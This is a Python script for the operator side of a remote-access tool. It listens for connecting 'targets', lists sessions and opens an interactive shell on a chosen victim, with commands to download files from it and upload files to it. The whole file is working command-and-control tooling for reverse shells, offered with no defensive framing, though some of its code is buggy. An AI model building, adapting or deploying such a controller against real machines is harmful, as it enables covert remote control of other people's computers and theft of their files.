from socket import *
import json as j
import os
import base64 as ba
from threading import *

def shell(target, ip):
    def reliable_send(data):
        json_data = j.dumps(data)
        target.send(json_data)
    
    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return j.loads(data)
            except ValueError:
                continue
    global cnt
    while True:
        cmd = input("Shell~# ")
        reliable_send(cmd)
        if cmd == "q":
            break
                
        elif cmd[:2] == "cd" and len(cmd) > 1:
            continue
                
        elif cmd[:8] == "download": 
            with open(cmd[9:], "wb") as f:
                f_data = reliable_recv()
                f.write(ba.b64decode(f_data))
                    
        elif cmd[:6] == "upload":
            try:
                with open(cmd[7:], "rb") as fi:
                    reliable_send(ba.b64encode(fi.read()))
            except:
                failed = "Failed to upload file..."
                reliable_send(ba.b64encode(failed))
                            
        else:
            result = reliable_recv()
            print(result)
            

def server():
    global cl
    while True:
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[cl]) + " ==== " + str(ips[cl]) + " connected")
            cl += 1
            
        except:
            pass
            

global s
ips = []
targets = []
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 1234))
s.listen(5)

cl = 0
stop = False
print("Waiting for target connections...")
t1 = Thread(target=server)
t1.start()

while True:
    cmd = input("Center_Shell~# ")
    if cmd == "targets":
        cnt = 0
        for ip in ips:
            print("Session "+ str(cnt) + " ==== " + str(ip))
            cnt += 1
    elif cmd[:7] == "session":
        try:
            n = int(cmd[8:])
            tarn = targets[n]
            tarip = ips[n]
            shell(tarn, tarip)
        except:
            print("No session under the number specified")
